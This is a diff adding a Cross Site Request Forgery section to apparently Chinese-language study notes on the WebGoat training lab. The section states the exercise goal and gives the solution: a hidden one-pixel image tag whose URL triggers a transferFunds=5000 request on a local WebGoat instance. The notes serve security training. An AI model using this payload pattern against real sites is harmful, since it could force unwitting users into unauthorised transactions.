@@ -130,6 +130,8 @@
 ![PROCESS.img](images/stored_xss_attack.png)
 ![OUTCOME.img](images/stored_xss_attacks_outcome.png)
 
+**2-->Cross Site Request Forgery (CSRF)**
+ 
 **实验**
 * goal: 发送一封email。这个email包含一个image，其URL指向一个恶意请求。在这个课程中，URL应该指向“attack”servlet，其带有课程“Screen”和“menu”参数，一个额外参数“"transferFunds”带有任意数字值诸如5000
 * solution: 在Title输入：`Cross Site Request Forgery Attack`，在Message输入：`<img src="http://127.0.0.1:8087/WebGoat/attack?Screen=280&menu=900&transferFunds=5000" width="1" height="1" />`
